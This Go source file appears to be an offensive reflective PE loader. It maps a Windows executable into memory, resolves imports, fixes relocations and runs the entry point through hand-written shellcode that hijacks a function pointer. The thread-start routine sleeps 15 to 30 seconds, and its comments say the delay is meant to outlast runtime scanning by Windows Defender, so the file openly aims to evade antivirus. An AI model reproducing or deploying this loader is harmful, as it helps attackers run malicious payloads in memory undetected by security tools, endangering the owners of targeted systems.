package lib

import (
	"debug/pe"
	"encoding/hex"
	"fmt"
	"time"
	. "unsafe"

	log "github.com/sirupsen/logrus"
)

func PreparePEHeaders(bin BinAPI) {
	bin.FillFileHeader()
	bin.FillOptionalHeader()
}

func CopyHeaders(api WinAPI, start, dst BinAPI) {
	api.Memcopy(start.GetAddr(), dst.GetAddr(), uintptr(start.GetHeaderSize()))
}

func RegisterNewSection(binary BinAPI, originalSection *pe.SectionHeader32) {
	section := Section{
		Name:    string(originalSection.Name[:]),
		Address: Pointer(binary.GetAddr() + uintptr(originalSection.VirtualAddress)),
		RVA:     uintptr(originalSection.VirtualAddress),
		RRA:     uintptr(originalSection.PointerToRawData),
		Size:    uint(originalSection.VirtualSize),
		MemFlag: uint8(originalSection.Characteristics >> 24),
	}
	binary.AddSection(section)
}

func CopySections(api WinAPI, src, dst BinAPI) {
	numSections := Binary.GetNumSections()
	nextSection := uint(0)
	for i := uint(0); i < numSections; i++ {
		offsetSection := src.GetSizeOptionalHeader() + uintptr(nextSection)

		section := (*pe.SectionHeader32)(ptrOffset(src.GetOptionalHeader(), offsetSection))

		RegisterNewSection(dst, section)

		finalVA := dst.GetAddr() + uintptr(section.VirtualAddress)
		baseRaw := src.GetAddr() + uintptr(section.PointerToRawData)

		log.Debugf("Copying section %s to 0x%x", string(section.Name[:]), finalVA)

		api.Memcopy(baseRaw, finalVA, uintptr(section.SizeOfRawData))

		nextSection += uint(Sizeof(*section))
	}
}

func LoadLibraries(api WinAPI, bin BinAPI) (err error) {

	importAddress := bin.GetFirstImport()
	for i := 0; ; i++ {
		if importAddress.Name == 0 {
			break
		}
		ptrLibraryName := bin.GetAddr() + uintptr(importAddress.Name)
		libraryName := api.CstrVal(Pointer(ptrLibraryName))
		ptrLibrary, err := api.LoadLibrary(string(libraryName[:]))
		if err != nil {
			return fmt.Errorf("Could not load %s - %s", string(libraryName[:]), err)
		}

		log.Debugf("Loaded library %s at 0x%x", string(libraryName[:]), ptrLibrary)
		bin.AddModule(ptrLibrary, string(libraryName[:]), importAddress)
		importAddress = (*ImageImportDescriptor)(ptrOffset(Pointer(importAddress), Sizeof(*importAddress)))
	}
	return nil
}

func parseOrdinal(ordinal uint) (Pointer, string) {
	funcOrdinal := uint16(ordinal)
	ptrName := Pointer(uintptr(funcOrdinal))
	funcName := fmt.Sprintf("#%d", funcOrdinal)
	return ptrName, funcName
}
func parseFuncAddress(api WinAPI, base, offset uintptr) (Pointer, string) {
	pImageImportByName := (*ImageImportByName)(Pointer(base + offset))
	ptrName := Pointer(&pImageImportByName.Name)
	funcName := string(api.CstrVal(ptrName))
	return ptrName, funcName
}
func LoadFunction(api WinAPI, bin BinAPI, module Module) (err error) {
	var ptrName Pointer
	var funcName string

	offsetFirstThunk := uintptr(module.FirstThunkRVA)
	offsetOriginalfirstThunk := uintptr(module.OriginalFirstThunkRVA)
	for {
		firstThunk := (*ImageThunkData)(Pointer(bin.GetAddr() + offsetFirstThunk))
		originalfirstThunk := (*OriginalImageThunkData)(Pointer(bin.GetAddr() + offsetOriginalfirstThunk))
		if firstThunk.AddressOfData == 0 {
			break
		}
		if isMSBSet(originalfirstThunk.Ordinal) {
			ptrName, funcName = parseOrdinal(originalfirstThunk.Ordinal)
		} else {
			ptrName, funcName = parseFuncAddress(api, bin.GetAddr(), firstThunk.AddressOfData)
		}
		funcAddr, _ := api.GetProcAddress(module.Address, ptrName)
		log.Debugf("Imported function %s at 0x%x", string(funcName), funcAddr)
		firstThunk.AddressOfData = funcAddr

		offsetFirstThunk += Sizeof(uintptr(0))
		offsetOriginalfirstThunk += Sizeof(uintptr(0))
	}
	return err
}

func LoadFunctions(api WinAPI, bin BinAPI) (err error) {
	for _, module := range bin.GetModules() {
		err = LoadFunction(api, bin, module)
		if err != nil {
			return err
		}
	}
	return err
}

func FixImageRelocations(api WinAPI, bin BinAPI, ptrRelocations *ImageBaseRelocation, numEntries, diffOffset uintptr) {
	firstReloc := (*ImageReloc)(ptrOffset(Pointer(ptrRelocations), Sizeof(*ptrRelocations)))
	ptrReloc := Pointer(bin.GetAddr() + uintptr(ptrRelocations.VirtualAddress))

	var ptrFirstReloc Pointer

	for i := uintptr(0); i < numEntries-1; i++ {
		ptrFirstReloc = ptrOffset(ptrReloc, uintptr(firstReloc.GetOffset()))
		//fmt.Printf("Reloc from %x - ", *(*uintptr)(ptrFirstReloc))

		if firstReloc.GetType() == IMAGE_REL_BASED_DIR64 {
			api.Incr64(ptrFirstReloc, uint64(diffOffset))
		} else if firstReloc.GetType() == IMAGE_REL_BASED_HIGHLOW {
			api.Incr32(ptrFirstReloc, uint32(diffOffset))
		} else if firstReloc.GetType() == IMAGE_REL_BASED_HIGH {
			api.Incr16(ptrFirstReloc, uint16(diffOffset>>16))
		} else if firstReloc.GetType() == IMAGE_REL_BASED_LOW {
			api.Incr16(ptrFirstReloc, uint16(diffOffset))
		}
		//fmt.Printf(" to %x\n", *(*uintptr)(ptrFirstReloc))
		firstReloc = (*ImageReloc)(ptrOffset(Pointer(firstReloc), Sizeof(ImageReloc{})))
		//fmt.Printf("%x %x\n", firstReloc.GetType(), firstReloc.GetOffset())
	}
}

func FixRelocations(api WinAPI, bin BinAPI) {
	diffOffset := bin.GetAddr() - bin.GetImageBase()
	ptrRelocations := bin.GetRelocAddr()

	for {
		if uintptr(ptrRelocations.SizeOfBlock) < Sizeof(*ptrRelocations) {
			break
		}

		numEntries := (uintptr(ptrRelocations.SizeOfBlock) - Sizeof(*ptrRelocations)) / Sizeof(ImageReloc{})
		log.Infof("Will fix %d relocations", numEntries)
		FixImageRelocations(api, bin, ptrRelocations, numEntries, diffOffset)

		ptrRelocations = (*ImageBaseRelocation)(ptrOffset(Pointer(ptrRelocations), uintptr(ptrRelocations.SizeOfBlock)))
	}

}

func FixPogoEntry(api WinAPI, bin BinAPI, name string, pogoEntry *PogoEntry) {
	offset := uintptr(pogoEntry.Start_rva)
	firstPogoAddress := ptrOffset(Pointer(bin.GetAddr()), offset)
	for i := uintptr(0); i < uintptr(pogoEntry.Size); i += Sizeof(uintptr(0)) {
		pogoAddress := ptrOffset(firstPogoAddress, i)
		val := *(*uintptr)(pogoAddress)

		if val&bin.GetImageBase() == bin.GetImageBase() && val-bin.GetImageBase() < 0xFFFF {
			*(*uintptr)(pogoAddress) = val - bin.GetImageBase() + bin.GetAddr()
			log.Debugf("Updated pogo %s from %x to %x at %x\n", name, val, *(*uintptr)(pogoAddress), pogoAddress)
		}
	}
}
func FixPogo(api WinAPI, bin BinAPI, offset uintptr, size uint32) {
	pogoPtr := (*Pogo)(Pointer(bin.GetAddr() + offset))
	pogoEntry := (*PogoEntry)(ptrOffset(Pointer(pogoPtr), 4))
	for i := 0; ; i++ {
		if pogoEntry.Size == 0 {
			break
		}
		pogoName := api.CstrVal(Pointer(&pogoEntry.Name))

		FixPogoEntry(api, bin, string(pogoName), pogoEntry)
		offset = uintptr(len(pogoName)) + Sizeof(*pogoEntry) - 3 // compensate for Go struct alignment
		if offset%4 != 0 {
			offset += (4 - offset%4)
		}

		pogoEntry = (*PogoEntry)(ptrOffset(Pointer(pogoEntry), offset))
	}

}

func FixDebugSymbols(api WinAPI, bin BinAPI) {
	debugAddress := bin.GetDebugAddr()
	for i := 0; ; i++ {
		if debugAddress.SizeOfData == 0 {
			break
		}
		if debugAddress.Type == POGO_TYPE {
			debugRVA := bin.TranslateToRVA(uintptr(debugAddress.PointerToRawData))
			log.Infof("Will fix POGO debug at virtual offset: %x, size: %x\n", debugRVA, debugAddress.SizeOfData)
			FixPogo(api, bin, debugRVA, debugAddress.SizeOfData)
		}
		debugAddress = (*DebugDirectory)(ptrOffset(Pointer(debugAddress), Sizeof(*debugAddress)))
	}
}

func UpdateSectionProtections(api WinAPI, bin BinAPI) (err error) {
	var execFlag, writeFlag bool
	for _, section := range bin.GetSections() {
		execFlag = section.MemFlag&0x20 == 0x20
		writeFlag = section.MemFlag&0x80 == 0x80
		log.Debugf("Updating %s (%x) mem privileges: exec: %t, write: %t", section.Name, section.Address, execFlag, writeFlag)
		err = api.VirtualProtect(ptrValue(section.Address), uintptr(section.Size), execFlag, writeFlag)
		if err != nil {
			return err
		}
	}
	return nil
}

func FixOffsetsInSection(api WinAPI, bin BinAPI, section Section) {
	var rDataptr Pointer
	offset := section.RVA
	oldBaseAddress := bin.GetImageBase()

	for i := uintptr(0); i < uintptr(section.Size); i += Sizeof(uint(0)) {
		rDataptr = ptrOffset(Pointer(bin.GetAddr()), offset+i)
		//fmt.Printf("%s - %x: %x\n", section.Name, rDataptr, *(*uintptr)(rDataptr))
		val := *(*uintptr)(rDataptr)

		if val&oldBaseAddress == oldBaseAddress && val-oldBaseAddress < 0xFFFF {
			*(*uintptr)(rDataptr) = val - oldBaseAddress + bin.GetAddr()
			log.Debugf("%s: Updated from %x to %x at %x\n", section.Name, val, *(*uintptr)(rDataptr), rDataptr)
		}
	}
	//os.Exit(0)
}
func FixingHardcodedOffsets(api WinAPI, bin BinAPI) {
	for _, section := range bin.GetSections() {
		FixOffsetsInSection(api, bin, section)
	}
}

func StartThreadWait(api WinAPI, bin BinAPI) (err error) {

	entryPoint := bin.GetEntryPoint()

	api.NtFlushInstructionCache(bin.GetAddr(), bin.GetImageBase())

	r1, err := api.CreateThread(entryPoint)
	if err != nil {
		return err
	}

	log.Infof("Waiting a few seconds to trip off any runtime scan")
	time.Sleep(time.Duration(randInt(15, 30)) * time.Second) // Windows Defender gives up after 15 seconds

	api.ResumeThread(r1)
	api.WaitForSingleObject(r1)
	api.CloseHandle(r1)

	return nil
}

func PrepareJumper(api WinAPI, entryPoint Pointer) (Pointer, error) {
	opcode := fmt.Sprintf("48B8%xffd0", intToByteArray(ptrValue(entryPoint)))

	sc, err := hex.DecodeString(opcode)
	if err != nil {
		return nil, err
	}
	addr, err := api.VirtualAlloc(16)
	if err != nil {
		return nil, err
	}
	if err = api.VirtualProtect(ptrValue(addr), 16, false, true); err != nil {
		return nil, err
	}
	api.Memcopy(uintptr(Pointer(&sc[0])), ptrValue(addr), uintptr(len(sc)))
	if err = api.VirtualProtect(ptrValue(addr), 16, true, false); err != nil {
		return nil, err
	}

	return addr, err
}

func StartThread(api WinAPI, bin BinAPI) (err error) {

	entryPoint := bin.GetEntryPoint()
	addr, err := PrepareJumper(api, entryPoint)
	if err != nil {
		return err
	}
	f := func() {}

	err = api.VirtualProtect(*(*uintptr)(Pointer(&f)), Sizeof(uintptr(0)), false, true)
	fmt.Println(err)
	fmt.Printf("%x: %x\n", *(*uintptr)(Pointer(&f)), **(**uintptr)(Pointer(&f)))

	//**(**uintptr)(Pointer(&f)) = *(*uintptr)(Pointer(&entryPoint))
	**(**uintptr)(Pointer(&f)) = (uintptr)(addr)
	fmt.Printf("%x: %x\n", *(*uintptr)(Pointer(&f)), **(**uintptr)(Pointer(&f)))

	f()

	return nil
}
